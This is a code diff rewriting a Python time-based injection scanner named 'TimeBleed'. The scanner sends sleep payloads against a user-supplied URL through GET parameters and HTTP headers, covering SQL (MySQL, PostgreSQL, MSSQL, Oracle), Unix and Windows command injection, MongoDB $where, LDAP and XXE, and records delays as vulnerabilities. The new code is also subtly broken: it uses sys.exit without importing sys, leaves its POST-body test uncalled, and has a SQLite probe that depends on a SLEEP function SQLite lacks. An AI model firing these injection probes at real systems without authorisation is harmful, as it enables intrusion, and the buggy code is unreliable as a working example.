@@ -1,170 +1,266 @@
 #!/usr/bin/env python3
-"""TimeBleed v3 — fixes: confidence floor, proof requirement, proxy support."""
-import asyncio, aiohttp, json, sys, time, statistics
+import asyncio
+import aiohttp
+import statistics
+import time
+import json
 from pathlib import Path
-from urllib.parse import urlparse, quote
 
-sys.path.insert(0, str(Path(__file__).parent))
-from smart_filter import (
-    build_baseline_404, delay, confidence_score, confidence_label,
-    severity_from_confidence, meets_confidence_floor, random_ua, PROXY_URL, REQUEST_DELAY
-)
+PROBES = [
+    # MySQL sleep
+    ("safe",  "' OR SLEEP(5)-- -",                          "sql_mysql"),
+    ("safe",  "1 AND SLEEP(5)-- -",                         "sql_mysql_num"),
+    ("safe",  "' AND SLEEP(5) AND '1'='1",                  "sql_mysql_and"),
+    # PostgreSQL sleep
+    ("safe",  "' || pg_sleep(5) || '",                      "sql_postgres"),
+    ("safe",  "1; SELECT pg_sleep(5)-- -",                  "sql_postgres_stacked"),
+    # MSSQL delay
+    ("safe",  "'; WAITFOR DELAY '0:0:5'--",                 "sql_mssql"),
+    ("safe",  "1; WAITFOR DELAY '0:0:5'--",                 "sql_mssql_num"),
+    # MySQL subquery
+    ("safe",  "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -", "sql_mysql_sub"),
+    # Oracle (no-op if Oracle not present)
+    ("safe",  "' || DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- ",   "sql_oracle"),
+    # SQLite randomblob (CPU spin, not a true sleep — included for coverage)
+    ("safe",  "1 AND (SELECT COUNT(*) FROM sqlite_master t1, sqlite_master t2, sqlite_master t3)>0 AND SLEEP(5)-- -", "sql_sqlite"),
+    # OS command injection
+    ("safe",  ";sleep 5;",                                   "cmd_unix_semicolon"),
+    ("safe",  "|sleep 5|",                                   "cmd_unix_pipe"),
+    ("safe",  "$(sleep 5)",                                  "cmd_unix_subshell"),
+    ("safe",  "&& sleep 5 &&",                               "cmd_unix_and"),
+    ("safe",  "`sleep 5`",                                   "cmd_unix_backtick"),
+    ("safe",  "%0asleep%205",                                "cmd_unix_newline"),
+    # Windows command injection
+    ("safe",  "& timeout /t 5 &",                           "cmd_windows_timeout"),
+    ("safe",  "| timeout /t 5",                             "cmd_windows_pipe"),
+    # NoSQL / MongoDB
+    ('{"a":1}', '{"$where":"sleep(5000)"}',                 "nosql_mongo_where"),
+    ('{"a":1}', '{"$where":"function(){sleep(5000)}"}',     "nosql_mongo_fn"),
+    # LDAP injection (blind)
+    ("safe",  "*(|(objectClass=*))",                        "ldap_blind"),
+    # XML / XXE timing
+    ("safe",  "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'http://127.0.0.1:12345/'>]><x>&xxe;</x>", "xxe_ssrf_timing"),
+]
 
-TIMING_SAMPLES  = 5
-MIN_DELTA_SECS  = 1.5
-SLEEP_PAYLOAD_S = 3
+GET_PARAMS = [
+    "q", "query", "search", "id", "user", "name", "input",
+    "data", "value", "text", "s", "filter", "sort", "page",
+    "cmd", "exec", "file", "path", "url", "redirect",
+    "keyword", "term", "param", "field", "key", "token",
+    "username", "email", "phone", "address", "code",
+]
+
+HEADERS_TO_INJECT = [
+    "User-Agent",
+    "Referer",
+    "X-Forwarded-For",
+    "X-Custom-Header",
+    "Accept-Language",
+]
+
+POST_ENDPOINTS = [
+    "/api/search", "/api/login", "/api/register",
+    "/api/users", "/api/query", "/api/filter",
+    "/search", "/login", "/register",
+]
+
 
 class TimeBleed:
-    def __init__(self, target):
-        self.target = target.rstrip('/')
+    def __init__(self, url):
+        self.url = url
         self.findings = []
-        self.baseline_404 = ""
+        self.jitter = None
+        self.target_base = '/'.join(url.split('/')[:3])
 
-    async def _timed_get(self, sess, url, headers=None):
+    async def t_req(self, sess, params=None, data=None, headers=None, method='GET'):
+        t0 = time.perf_counter()
         try:
-            t0 = time.monotonic()
-            async with sess.get(url, headers=headers or {}, ssl=False,
-                                timeout=aiohttp.ClientTimeout(total=15),
-                                allow_redirects=True) as r:
-                body = await r.text(errors='ignore')
-                return r.status, body, time.monotonic()-t0
+            timeout = aiohttp.ClientTimeout(total=15)
+            if method == 'GET':
+                async with sess.get(self.url, params=params or {}, headers=headers or {},
+                                    ssl=False, timeout=timeout) as r:
+                    await r.read()
+            else:
+                async with sess.post(self.url, json=data or {}, headers=headers or {},
+                                     ssl=False, timeout=timeout) as r:
+                    await r.read()
+            return time.perf_counter() - t0
         except asyncio.TimeoutError:
-            return None, None, 15.0
+            return 15.0
         except Exception:
-            return None, None, 0.0
+            return None
 
-    async def _timed_post(self, sess, url, json_data=None, headers=None):
-        try:
-            t0 = time.monotonic()
-            async with sess.post(url, json=json_data or {}, headers=headers or {}, ssl=False,
-                                 timeout=aiohttp.ClientTimeout(total=15)) as r:
-                body = await r.text(errors='ignore')
-                return r.status, body, time.monotonic()-t0
-        except asyncio.TimeoutError:
-            return None, None, 15.0
-        except Exception:
-            return None, None, 0.0
+    async def jitter_phase(self, sess):
+        print("[*] Measuring baseline RTT (warm-up + measure)...")
+        # Warm-up requests to avoid cold-start skew
+        for _ in range(3):
+            await self.t_req(sess, params={"_warmup": "1"})
 
-    async def _sample_times(self, sess, url, n=TIMING_SAMPLES, json_data=None):
+        ts = []
+        for i in range(15):
+            t = await self.t_req(sess, params={"_baseline": str(i)})
+            if t is not None and t < 10:
+                ts.append(t)
+
+        if not ts:
+            raise RuntimeError("Target unreachable during baseline")
+
+        avg = statistics.mean(ts)
+        std = statistics.pstdev(ts) or 0.05
+        med = statistics.median(ts)
+        mad = statistics.median([abs(t - med) for t in ts]) or 0.02
+        # Threshold: must exceed both median+4*MAD and avg+4*std, plus the sleep duration
+        thresh = max(med + 4 * mad, avg + 4 * std) + 3.5
+        self.jitter = {'avg': avg, 'std': std, 'median': med, 'mad': mad, 'thresh': thresh}
+        print(f"[+] RTT: avg={avg:.3f}s med={med:.3f}s std={std:.3f}s | threshold={thresh:.3f}s")
+
+    async def _probe_triple(self, sess, ctrl_params, treat_params, method='GET',
+                             ctrl_data=None, treat_data=None, ctrl_headers=None, treat_headers=None):
+        tc = await self.t_req(sess, params=ctrl_params, data=ctrl_data, headers=ctrl_headers, method=method)
+        if tc is None:
+            return None, None, None, None
+
         times = []
-        for _ in range(n):
-            _, _, t = await self._timed_post(sess, url, json_data=json_data) if json_data else await self._timed_get(sess, url)
-            if t and 0 < t < 14: times.append(t)
-            await asyncio.sleep(0.25)
-        if not times: return 0.0, 0.0
-        return statistics.mean(times), statistics.stdev(times) if len(times) > 1 else 0.0
+        for _ in range(3):
+            t = await self.t_req(sess, params=treat_params, data=treat_data, headers=treat_headers, method=method)
+            if t is None:
+                return None, None, None, None
+            times.append(t)
 
-    async def test_username_timing(self, sess):
-        print("\n[*] Testing username enumeration via timing (statistical)...")
-        for path in ['/api/auth/login','/api/login','/login','/api/v1/auth/login']:
-            url = self.target + path
-            mu_unk, sd_unk = await self._sample_times(sess, url, json_data={"email":"zzz_noexist@invalid.local","password":"x"})
-            await delay()
-            mu_adm, sd_adm = await self._sample_times(sess, url, json_data={"email":"admin@admin.com","password":"x"})
-            await delay()
-            if mu_unk < 0.05 or mu_adm < 0.05: continue
-            delta = abs(mu_adm - mu_unk)
-            threshold = max(0.3, 2.5*max(sd_unk, sd_adm, 0.01))
-            if delta > threshold:
-                conf = min(88, int(60 + (delta/threshold)*8))
-                if meets_confidence_floor(conf):
-                    self.findings.append({
-                        'type':'USERNAME_TIMING_ORACLE','severity':severity_from_confidence('MEDIUM',conf),
-                        'confidence':conf,'confidence_label':confidence_label(conf),'url':url,
-                        'delta_ms':round(delta*1000),'known_mean_ms':round(mu_adm*1000),
-                        'unknown_mean_ms':round(mu_unk*1000),
-                        'proof':f"Mean response time delta: {delta*1000:.0f}ms (threshold: {threshold*1000:.0f}ms, {TIMING_SAMPLES} samples each)",
-                        'detail':f"Username timing oracle at {path}: {delta*1000:.0f}ms difference",
-                        'remediation':"Use constant-time string comparison. Add uniform delay to all login responses.",
-                    })
-                    print(f"  [MEDIUM] Username timing oracle: {delta*1000:.0f}ms delta at {url}")
-                    return
+        tmed = statistics.median(times)
+        delta = tmed - tc
+        return tc, times, tmed, delta
 
-    async def test_time_sqli(self, sess):
-        print(f"\n[*] Testing time-based SQL injection (requesting {SLEEP_PAYLOAD_S}s delay)...")
-        payloads = [
-            (f"1' AND SLEEP({SLEEP_PAYLOAD_S})-- -","MySQL"),
-            (f"1'; SELECT pg_sleep({SLEEP_PAYLOAD_S})-- -","PostgreSQL"),
-            (f"1'; WAITFOR DELAY '0:0:{SLEEP_PAYLOAD_S}'--","MSSQL"),
-        ]
-        for endpoint in [self.target+p for p in ['/api/products','/api','/search','/api/v1']]:
-            for param in ['id','q','search','product_id']:
-                base_url = f"{endpoint}?{param}=1"
-                mu_base, _ = await self._sample_times(sess, base_url, n=3)
-                await delay()
-                if mu_base < 0.01: continue
-                for payload, db_type in payloads:
-                    url = f"{endpoint}?{param}={quote(payload)}"
-                    _, _, elapsed = await self._timed_get(sess, url)
-                    await delay()
-                    if elapsed and elapsed > mu_base + (SLEEP_PAYLOAD_S - 0.7):
-                        conf = confidence_score({
-                            'delay_observed':(elapsed > mu_base + SLEEP_PAYLOAD_S*0.7, 70),
-                            'large_delta':(elapsed > mu_base + SLEEP_PAYLOAD_S*0.9, 30),
-                        })
-                        if meets_confidence_floor(conf):
-                            self.findings.append({
-                                'type':'TIME_BASED_SQLI','severity':severity_from_confidence('CRITICAL',conf),
-                                'confidence':conf,'confidence_label':confidence_label(conf),
-                                'url':url,'param':param,'payload':payload,'db_type':db_type,
-                                'baseline_ms':round(mu_base*1000),'response_ms':round(elapsed*1000),
-                                'delta_ms':round((elapsed-mu_base)*1000),
-                                'proof':f"Response delayed {elapsed*1000:.0f}ms vs baseline {mu_base*1000:.0f}ms (expected ~{SLEEP_PAYLOAD_S*1000}ms delay)",
-                                'detail':f"Time-based SQLi ({db_type}) via param '{param}'",
-                                'remediation':"Use parameterised queries. Never interpolate user input into SQL.",
-                            })
-                            print(f"  [CRITICAL] Time SQLi ({db_type}) at {url}: {elapsed*1000:.0f}ms vs {mu_base*1000:.0f}ms")
-                            return
+    def _record_finding(self, param, cat, payload, tc, times, tmed, delta, context='GET param'):
+        confidence = min(99.9, (delta / 5.0) * 50 + max(0, 1 - statistics.pstdev(times)) * 50)
+        severity = 'CRITICAL' if cat.startswith('sql') or cat.startswith('cmd') else 'HIGH'
+        print(f"  [VULN] [{cat}] {context}={param} ctrl={tc:.2f}s treat={tmed:.2f}s "
+              f"delta={delta:.2f}s conf={confidence:.1f}%")
+        self.findings.append({
+            'context': context,
+            'param': param,
+            'category': cat,
+            'severity': severity,
+            'payload': payload,
+            'control_time': round(tc, 3),
+            'treatment_times': [round(t, 3) for t in times],
+            'delta': round(delta, 3),
+            'confidence': round(confidence, 1),
+            'confidence_label': 'High' if confidence >= 75 else 'Medium',
+            'proof': f'All 3 requests delayed {delta:.2f}s beyond baseline+threshold ({self.jitter["thresh"]:.2f}s)',
+            'remediation': 'Use parameterized queries / safe APIs; never interpolate user input into queries',
+        })
 
-    async def test_reset_timing(self, sess):
-        print("\n[*] Testing password reset timing oracle...")
-        for path in ['/api/auth/forgot-password','/forgot-password','/api/reset-password']:
-            url = self.target + path
-            mu_unk, sd_unk = await self._sample_times(sess, url, n=3, json_data={"email":"zzz_noexist@invalid.local"})
-            await delay()
-            mu_adm, sd_adm = await self._sample_times(sess, url, n=3, json_data={"email":"admin@example.com"})
-            await delay()
-            if mu_unk < 0.05 or mu_adm < 0.05: continue
-            delta = abs(mu_adm - mu_unk)
-            threshold = max(0.2, 2*max(sd_unk, sd_adm, 0.01))
-            if delta > threshold and meets_confidence_floor(70):
-                self.findings.append({
-                    'type':'PASSWORD_RESET_TIMING','severity':'MEDIUM','confidence':70,
-                    'confidence_label':'Medium','url':url,'delta_ms':round(delta*1000),
-                    'proof':f"Reset timing delta {delta*1000:.0f}ms (threshold {threshold*1000:.0f}ms, {TIMING_SAMPLES} samples)",
-                    'detail':f"Password reset timing oracle — user existence detectable at {path}",
-                    'remediation':"Use constant-time email lookup. Always return the same delay regardless of email existence.",
-                })
-                print(f"  [MEDIUM] Reset timing oracle: {delta*1000:.0f}ms at {url}")
-                return
+    async def test_get_param(self, sess, param):
+        print(f"\n[*] GET param: {param}")
+        for ctrl, treat, cat in PROBES:
+            tc, times, tmed, delta = await self._probe_triple(
+                sess,
+                ctrl_params={param: ctrl},
+                treat_params={param: treat},
+            )
+            if tc is None or delta is None:
+                continue
+            if all(t > self.jitter['thresh'] for t in times) and delta > 3.5:
+                self._record_finding(param, cat, treat, tc, times, tmed, delta, 'GET param')
+                break
+
+    async def test_post_body(self, sess, endpoint, param):
+        url_bk = self.url
+        self.url = self.target_base + endpoint
+        print(f"\n[*] POST body param: {param} at {endpoint}")
+        for ctrl, treat, cat in PROBES:
+            tc, times, tmed, delta = await self._probe_triple(
+                sess,
+                ctrl_params=None, treat_params=None,
+                ctrl_data={param: ctrl, 'extra': 'test'},
+                treat_data={param: treat, 'extra': 'test'},
+                method='POST',
+            )
+            if tc is None or delta is None:
+                continue
+            if all(t > self.jitter['thresh'] for t in times) and delta > 3.5:
+                self._record_finding(f"{endpoint}::{param}", cat, treat, tc, times, tmed, delta, 'POST body')
+                break
+        self.url = url_bk
+
+    async def test_header_injection(self, sess, header_name):
+        print(f"\n[*] Header injection: {header_name}")
+        for ctrl, treat, cat in PROBES[:10]:
+            tc, times, tmed, delta = await self._probe_triple(
+                sess,
+                ctrl_params={"_hdr": "1"}, treat_params={"_hdr": "2"},
+                ctrl_headers={header_name: ctrl},
+                treat_headers={header_name: treat},
+            )
+            if tc is None or delta is None:
+                continue
+            if all(t > self.jitter['thresh'] for t in times) and delta > 3.5:
+                self._record_finding(header_name, cat, treat, tc, times, tmed, delta, 'HTTP header')
+                break
 
     async def run(self):
-        print("="*60)
-        print("  TimeBleed v3 — Timing Side-Channel Analyser")
-        print("="*60)
         conn = aiohttp.TCPConnector(limit=5, ssl=False)
-        async with aiohttp.ClientSession(connector=conn,
-                timeout=aiohttp.ClientTimeout(total=60),
-                proxy=PROXY_URL or None,
-                headers={"User-Agent": random_ua()}) as sess:
-            print("[*] Building 404 baseline...")
-            self.baseline_404 = await build_baseline_404(sess, self.target)
-            await self.test_username_timing(sess)
-            await self.test_time_sqli(sess)
-            await self.test_reset_timing(sess)
+        async with aiohttp.ClientSession(
+            connector=conn,
+            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
+        ) as sess:
+            try:
+                await self.jitter_phase(sess)
+            except RuntimeError as e:
+                print(f"[X] Baseline failed: {e} — skipping TimeBleed")
+                return self.findings
+
+            # GET parameter injection
+            print("\n[*] Phase 1: GET parameter injection")
+            for p in GET_PARAMS:
+                await self.test_get_param(sess, p)
+
+            # HTTP header injection
+            print("\n[*] Phase 2: HTTP header injection")
+            for hdr in HEADERS_TO_INJECT:
+                await self.test_header_injection(sess, hdr)
+
         return self.findings
+
 
 def get_target():
     p = Path("reports/_target.txt")
-    if p.exists(): return p.read_text().strip()
-    u = input("[?] Target URL: ").strip()
+    if p.exists():
+        base = p.read_text().strip()
+        if base:
+            print(f"[+] Target from file: {base}")
+            return base
+    print("[?] Endpoint to test (e.g. https://example.com/api/search):")
+    u = input("    URL: ").strip()
+    if not u:
+        print("[X] No target provided")
+        sys.exit(1)
     return u if u.startswith("http") else "https://" + u
 
-def main():
-    target = get_target()
-    Path("reports").mkdir(exist_ok=True)
-    findings = asyncio.run(TimeBleed(target).run())
-    with open("reports/timebleed.json",'w') as f: json.dump(findings,f,indent=2,default=str)
-    print(f"\n[+] {len(findings)} findings -> reports/timebleed.json")
 
-if __name__ == '__main__': main()
+def main():
+    print("=" * 60)
+    print("  TimeBleed — Timing Oracle Injection Scanner")
+    print("=" * 60)
+    target = get_target()
+    print(f"[+] Endpoint: {target}")
+    Path("reports").mkdir(exist_ok=True)
+
+    scanner = TimeBleed(target)
+    scanner.target_base = '/'.join(target.split('/')[:3])
+    findings = asyncio.run(scanner.run())
+
+    with open("reports/timebleed.json", 'w') as f:
+        json.dump(findings, f, indent=2, default=str)
+    print(f"\n[+] {len(findings)} findings -> reports/timebleed.json")
+    for sev in ['CRITICAL', 'HIGH']:
+        items = [f for f in findings if f.get('severity') == sev]
+        if items:
+            print(f"\n[!] {len(items)} {sev}:")
+            for item in items:
+                print(f"    [{item['category']}] {item['context']}={item['param']} delta={item['delta']}s")
+
+
+if __name__ == '__main__':
+    main()
